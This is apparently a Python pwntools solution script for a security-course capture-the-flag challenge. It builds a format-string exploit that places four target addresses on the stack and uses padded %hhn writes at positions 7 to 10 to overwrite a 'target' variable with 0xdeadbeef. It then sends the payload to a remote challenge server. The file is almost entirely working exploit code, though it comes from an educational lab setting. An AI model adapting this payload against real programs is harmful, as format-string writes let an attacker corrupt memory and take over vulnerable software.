from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25196

s = process('./program/06_write_big_number', shell=True)

elf = ELF('./program/06_write_big_number')
target_addr = elf.symbols['target']

print(f"Target addresses to write the integer: \
    \n{hex(target_addr)} \
      \n{hex(target_addr+1)} \
          \n{hex(target_addr+2)} \
              \n{hex(target_addr+3)}")

addr1 = target_addr      
addr2 = target_addr + 1  
addr3 = target_addr + 2  
addr4 = target_addr + 3  

payload = p32(addr1) + p32(addr2) + p32(addr3) + p32(addr4)

byte1 = 0xef  # 239
byte2 = 0xbe  # 190
byte3 = 0xad  # 173
byte4 = 0xde  # 222

written = 4*4  # 4 addresses, each 4 bytes

padding1 = byte1 - written # 239 - 16 = 223
if padding1 <= 0:
    padding1 += 256
padding2 = (byte2 - byte1) % 256 # 190 - 239 = -49 % 256 = 207
if padding2 <= 0:
    padding2 += 256
padding3 = (byte3 - byte2) % 256 # 173 - 190 = -17 % 256 = 239
if padding3 <= 0:
    padding3 += 256
padding4 = (byte4 - byte3) % 256 # 222 - 173 = 49
if padding4 <= 0:
    padding4 += 256
    
payload += b'%' + str(padding1).encode() + b'x' + b'%7$hhn' # 7th register on stack is controlled by me and I put there the first address
payload += b'%' + str(padding2).encode() + b'x' + b'%8$hhn' # 8th register on stack is controlled by me and I put there the second address
payload += b'%' + str(padding3).encode() + b'x' + b'%9$hhn' # 9th register ... the third address
payload += b'%' + str(padding4).encode() + b'x' + b'%10$hhn' # 10th register ... the fourth address

s = remote(SERVER, PORT, timeout=9999)
s.sendline(payload) 
response = s.recv().decode(errors='ignore')
s.close()
print(response)